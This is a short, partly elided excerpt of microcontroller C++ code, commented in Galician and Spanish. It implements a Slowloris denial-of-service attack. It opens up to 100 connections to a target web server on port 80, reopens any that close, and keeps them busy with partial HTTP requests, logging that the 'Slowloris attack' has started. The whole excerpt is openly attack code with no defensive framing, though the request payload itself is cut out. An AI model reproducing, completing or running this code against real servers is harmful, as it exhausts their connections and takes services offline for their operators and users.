...
const int target_port = 80;               // Puorto HTTP (xeralmente 80)
const int max_connections = 100;          // Número máximo de conexiones a abrir
const int delay_between_packets = 10;    // Tempo entre envíos de datos (en segundos)

WiFiClient clients[max_connections];     // Array pra almacenar as conexiones

void setup() {
  // Inicializa a comunicación serial
  Serial.begin(9600);
  Serial.println("Iniciando ataque Slowloris pra o numero de conexions:");
...
void loop() {
 ...
 //Apertura de novas conexiones ( ou reabir as cerradas )
  for (int i = 0; i < max_connections; i++) {
    if (!clients[i].connected()) {
      if (clients[i].connect(target_ip, target_port)) {
        // Envía unha solicitud HTTP parcial
        ...
        Serial.print("Error ao establecer a conexión ");
        Serial.println(i + 1);
      }
    } else {
      active_connections++;
